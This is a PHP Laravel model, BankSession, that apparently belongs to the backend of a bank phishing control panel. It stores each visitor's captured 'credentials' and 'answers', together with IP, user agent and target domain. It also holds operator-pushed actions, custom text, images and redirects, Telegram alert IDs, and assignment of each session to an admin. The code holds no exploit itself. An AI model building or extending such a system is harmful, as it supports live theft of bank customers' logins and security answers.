<?php

namespace App\Models;

use App\Enums\BankSessionStatus;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\Str;

class BankSession extends Model
{
    protected $keyType    = 'string';
    public    $incrementing = false;

    protected $fillable = [
        'id', 'log_number', 'domain', 'bank_slug', 'status', 'action_type',
        'credentials', 'answers', 'custom_text',
        'custom_image_url', 'redirect_url',
        'ip_address', 'user_agent',
        'telegram_message_id', 'telegram_chat_id',
        'admin_id', 'last_activity_at',
    ];

    protected $casts = [
        'status'           => BankSessionStatus::class,
        'action_type'      => 'array',
        'credentials'      => 'encrypted:array',
        'answers'          => 'array',
        'last_activity_at' => 'datetime',
    ];

    protected static function boot(): void
    {
        parent::boot();
        static::creating(function (self $s) {
            if (empty($s->id))            $s->id = (string) Str::uuid();
            if ($s->status === null)      $s->status = BankSessionStatus::Pending;
            if ($s->action_type === null) $s->action_type = ['type' => 'idle'];
            if ($s->answers === null)     $s->answers = [];
        });
    }

    public function isPending(): bool   { return $this->status === BankSessionStatus::Pending; }
    public function isAssigned(): bool  { return $this->status === BankSessionStatus::Assigned; }
    public function isCompleted(): bool { return $this->status === BankSessionStatus::Completed; }

    public function scopePending(Builder $q): Builder   { return $q->where('status', BankSessionStatus::Pending); }
    public function scopeAssigned(Builder $q): Builder  { return $q->where('status', BankSessionStatus::Assigned); }
    public function scopeCompleted(Builder $q): Builder { return $q->where('status', BankSessionStatus::Completed); }

    public function scopeForAdmin(Builder $q, int $adminId): Builder
    {
        return $q->where('admin_id', $adminId);
    }

    public function pushAnswer(array $answer): void
    {
        $this->answers = [...($this->answers ?? []), $answer];
        $this->save();
    }
}
